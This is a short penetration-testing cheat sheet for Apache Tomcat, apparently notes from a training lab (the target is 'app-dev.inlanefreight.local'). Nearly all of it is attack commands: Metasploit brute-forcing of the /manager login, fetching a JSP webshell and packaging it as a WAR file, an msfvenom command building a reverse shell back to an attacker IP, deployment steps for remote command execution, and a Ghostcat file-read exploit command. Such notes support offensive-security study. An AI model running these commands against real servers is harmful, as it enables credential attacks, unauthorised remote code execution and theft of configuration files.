# Cheatsheet

| ***Command***                                                                                                                                                    | ***Usage***                                                                                                |
| ---------------------------------------------------------------------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------- |
| Use `scanner/http/tomcat_mgr_login` from metasploit.<br><br>Set `VHOST`, `RPORT`, `stop_on_success true`, and `rhosts`.                                          | Brute forcing the `/manager` endpoint.                                                                     |
| [Brute Forcing using a python script](https://github.com/b33lz3bub-1/Tomcat-Manager-Bruteforce).                                                                 | Brute forcing the `/manager` endpoint.                                                                     |
| `wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp`<br><br>After wget: `zip -r backup.war cmd.jsp`<br><br>                | Uploading a `WAR` File for **RCE**.                                                                        |
| `msfvenom -p java/jsp_shell_reverse_tcp LHOST=<attacker-ip> LPORT=<port> -f war > backup.war`                                                                    | Generates a JSP **reverse shell** named `backup.war`.                                                      |
| `Browse` > Uplaod the file > `Deploy`.<br>Then `/backup` will be added to the table. Then go to `http://<url>/backup/cmd.jsp?cmd=id` for the shell.              | Uploading process for the `Backup.war` file                                                                |
| <br>[PoC](https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi)<br><br>`python2.7 tomcat-ajp.lfi.py app-dev.inlanefreight.local -p 8009 -f WEB-INF/web.xml ` | **Ghostcat**.<br>Unauthenticated LFI.<br><br>Affecting Tomcat versions before 9.0.31, 8.5.51, and 7.0.100. |


# Related Pages

[Tomcat Enumeration](I.%20Enumeration/Web%20Enumeration/Common%20WebApps/Tomcat%20Enumeration.md)
